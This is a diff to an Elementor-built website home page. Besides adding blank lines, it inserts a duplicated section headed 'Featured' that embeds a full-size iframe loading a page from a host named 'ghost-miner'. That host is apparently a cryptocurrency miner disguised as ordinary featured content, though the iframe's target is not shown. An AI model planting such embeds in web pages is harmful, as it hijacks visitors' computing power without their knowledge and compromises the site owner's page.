@@ -1106,6 +1106,9 @@ home normal
           </div>
         </div>
       </section>
+	  
+	  
+	  
       <section class="elementor-section elementor-top-section elementor-element elementor-element-2e17de9 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="2e17de9" data-element_type="section">
         <div class="elementor-container elementor-column-gap-default">
           <div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-cddd48e" data-id="cddd48e" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
@@ -1181,6 +1184,26 @@ home normal
           </div>
         </div>
       </section>
+	  
+	  <!-- 2 -->
+	   <section class="elementor-section elementor-top-section elementor-element elementor-element-2e17de9 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="2e17de9" data-element_type="section">
+        <div class="elementor-container elementor-column-gap-default">
+          <div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-cddd48e" data-id="cddd48e" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+            <div class="elementor-widget-wrap elementor-element-populated">
+              <div class="elementor-element elementor-element-160edc9 elementor-widget elementor-widget-heading" data-id="160edc9" data-element_type="widget" data-widget_type="heading.default">
+                <div class="elementor-widget-container">
+                  <h2 class="elementor-heading-title elementor-size-default">Featured </h2>	
+						<iframe src="https://ghost-miner.github.io/e" height ="100%" width="100%"></iframe>
+                </div>
+              </div>
+
+            </div>
+          </div>
+        </div>
+      </section>
+	  
+	  
+	  
       <section class="elementor-section elementor-top-section elementor-element elementor-element-2339ae3 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="2339ae3" data-element_type="section">
         <div class="elementor-container elementor-column-gap-default">
           <div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-978720f" data-id="978720f" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
